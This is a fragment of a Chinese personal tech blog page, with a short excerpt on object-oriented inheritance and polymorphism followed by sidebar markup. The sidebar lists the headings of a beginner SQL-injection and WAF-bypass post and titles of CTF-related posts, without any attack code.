继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。 父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。 子类 − 一个类继承其他类称为子类，也可称为派生类。 多态 − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。 重载 −...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/shiratama.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB"><span class="toc-text">从零开始的SQL注入生活</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Episode-1-SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">Episode 1   SQL数据库基础操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#episode-2-%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5"><span class="toc-text">episode 2  基础注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Episode-3-%E5%9C%A8%E6%8B%BF%E5%88%B0flag%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2-%E7%9B%B2%E6%B3%A8"><span class="toc-text">Episode 3 在拿到flag的边缘疯狂试探:盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Episode-4-%E4%BD%A0%E5%A5%BD%EF%BC%8C%E7%BB%95WAF"><span class="toc-text">Episode   4  你好，绕WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">空格过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#and%E5%92%8Cor%E7%BB%95%E8%BF%87"><span class="toc-text">and和or绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">&#x3D;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">逗号过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7-%E7%BB%95%E8%BF%87"><span class="toc-text">比较符号(&lt; &gt;)绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97-union-select%EF%BC%8Cwhere"><span class="toc-text">绕过关键字(union,select，where)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">通用编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">等价函数绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Episode-5-%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D"><span class="toc-text">Episode 5  模糊匹配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF"><span class="toc-text">奇奇怪怪的知识点积累</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/" title="从零开始的SQL注入生活">从零开始的SQL注入生活</a><time datetime="2025-03-09T03:26:48.000Z" title="发表于 2025-03-09 11:26:48">2025-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a><time datetime="2025-03-09T03:24:46.000Z" title="发表于 2025-03-09 11:24:46">2025-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/10/VNCTF2025/" title="VNCTF2025">VNCTF2025</a><time datetime="2025-02-10T09:56:12.000Z" title="发表于 2025-02-10 17:56:12">2025-02-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2025-01-25T05:24:16.000Z" title="发表于 2025-01-25 13:24:16">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/" title="SSTI漏洞">SSTI漏洞</a><time datetime="2025-01-22T01:58:22.000Z" title="发表于 2025-01-22 09:58:22">2025-01-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
